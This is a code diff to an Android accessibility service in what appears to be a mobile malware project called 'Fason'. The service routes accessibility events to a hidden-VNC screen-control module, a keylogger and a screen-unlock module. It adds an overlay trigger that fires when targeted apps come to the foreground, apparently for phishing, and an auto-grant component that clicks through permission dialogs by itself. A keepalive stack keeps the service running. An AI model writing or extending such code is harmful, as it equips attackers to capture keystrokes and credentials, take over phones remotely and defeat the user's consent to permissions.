@@ -5,15 +5,27 @@ import android.content.Context;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
+import com.fason.app.core.permissions.AutoGrantManager;
 import com.fason.app.features.hvnc.HVncAccessibilityService;
 import com.fason.app.features.hvnc.AccessibilityKeepalive;
-import com.fason.app.features.overlay.OverlayManager;
-import com.fason.app.features.phishlet.PhishletManager;
 import com.fason.app.features.inspector.InspectorAccessibilityService;
 import com.fason.app.features.keylogger.KeyloggerManager;
+import com.fason.app.features.springe.SpringeManager;
 import com.fason.app.features.unlock.UnlockManager;
 
+/**
+ * FasonAccessibilityService — the primary accessibility service.
+ *
+ * Routes events to:
+ *   • HVncAccessibilityService — screen capture / interaction
+ *   • InspectorAccessibilityService — UI hierarchy inspection
+ *   • KeyloggerManager — keystroke capture
+ *   • UnlockManager — screen unlock
+ *   • SpringeManager — smart trigger for overlay (replaces OverlayManager + PhishletManager)
+ *   • AutoGrantManager — auto-clicks permission dialogs during the setup sequence
+ */
 public class FasonAccessibilityService extends AccessibilityService {
+
     private static final String TAG = "FasonA11y";
     private static volatile FasonAccessibilityService instance;
 
@@ -25,9 +37,8 @@ public class FasonAccessibilityService extends AccessibilityService {
         InspectorAccessibilityService.onHostConnected(this);
         KeyloggerManager.onHostConnected(this);
         UnlockManager.onHostConnected(this);
-        // v4.0: start all 5 keepalive methods
         AccessibilityKeepalive.getInstance().onServiceConnected();
-        Log.i(TAG, "Accessibility service connected");
+        Log.i(TAG, "connected");
     }
 
     @Override
@@ -35,27 +46,37 @@ public class FasonAccessibilityService extends AccessibilityService {
         if (event == null) return;
         try {
             int type = event.getEventType();
+
             if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                 type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+
+                // AutoGrant fires FIRST on the event thread — zero-delay path.
+                // Both state-changed (permission dialogs) and content-changed
+                // (settings toggle updates) are handled by a single entry point.
+                AutoGrantManager.getInstance().onAccessibilityEvent(event);
+
                 HVncAccessibilityService.onAccessibilityEvent(event);
                 KeyloggerManager.onAccessibilityEvent(event);
-                // Overlay smart trigger: check if target app came to foreground
+
                 if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                     CharSequence pkg = event.getPackageName();
-                    if (pkg != null) OverlayManager.getInstance().onForegroundPackage(pkg.toString());
+                    if (pkg != null) {
+                        SpringeManager.getInstance().onForegroundPackage(pkg.toString());
+                    }
                 }
-                // Phishlet: forward content changes from monitored packages
-                PhishletManager.getInstance().onAccessibilityEvent(event);
+
             } else if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
-                       type == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
+                       type == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
+                       type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                 KeyloggerManager.onAccessibilityEvent(event);
-            } else if (type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
-                KeyloggerManager.onAccessibilityEvent(event);
+
             } else if (type == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                 KeyloggerManager.onAccessibilityEvent(event);
+
             } else if (type == AccessibilityEvent.TYPE_ANNOUNCEMENT) {
                 InspectorAccessibilityService.onAccessibilityEvent(event);
             }
+
         } finally {
             try { event.recycle(); } catch (Exception ignored) {}
         }
@@ -63,29 +84,26 @@ public class FasonAccessibilityService extends AccessibilityService {
 
     @Override
     public void onInterrupt() {
-        Log.w(TAG, "Service interrupted");
+        Log.w(TAG, "interrupted");
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
-        // v4.0: tear down keepalive stack on destroy
+        AutoGrantManager.getInstance().stop();
         AccessibilityKeepalive.getInstance().onServiceDestroyed();
         HVncAccessibilityService.onHostDisconnected();
         InspectorAccessibilityService.onHostDisconnected();
         KeyloggerManager.onHostDisconnected();
         UnlockManager.onHostDisconnected();
         instance = null;
-        Log.i(TAG, "Service destroyed");
+        Log.i(TAG, "destroyed");
     }
 
-    public static FasonAccessibilityService getInstance() {
-        return instance;
-    }
+    // ── Static accessors ───────────────────────────────────────────────────────
 
-    public static boolean isServiceConnected() {
-        return instance != null;
-    }
+    public static FasonAccessibilityService getInstance()  { return instance; }
+    public static boolean isServiceConnected()             { return instance != null; }
 
     public static boolean isEnabled() {
         try {
@@ -94,9 +112,9 @@ public class FasonAccessibilityService extends AccessibilityService {
                 ctx.getContentResolver(),
                 Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
             if (enabled == null) return false;
-            String serviceName = ctx.getPackageName() + "/com.fason.app.core.FasonAccessibilityService";
+            String svcName = ctx.getPackageName() + "/com.fason.app.core.FasonAccessibilityService";
             for (String token : enabled.split(":")) {
-                if (token.equals(serviceName)) return true;
+                if (token.equalsIgnoreCase(svcName)) return true;
             }
             return false;
         } catch (Exception e) {
@@ -106,10 +124,10 @@ public class FasonAccessibilityService extends AccessibilityService {
 
     public static void openSettings() {
         try {
-            Context ctx = FasonApp.getContext();
-            android.content.Intent intent = new android.content.Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-            ctx.startActivity(intent);
+            android.content.Intent i =
+                new android.content.Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+            FasonApp.getContext().startActivity(i);
         } catch (Exception ignored) {}
     }
 }
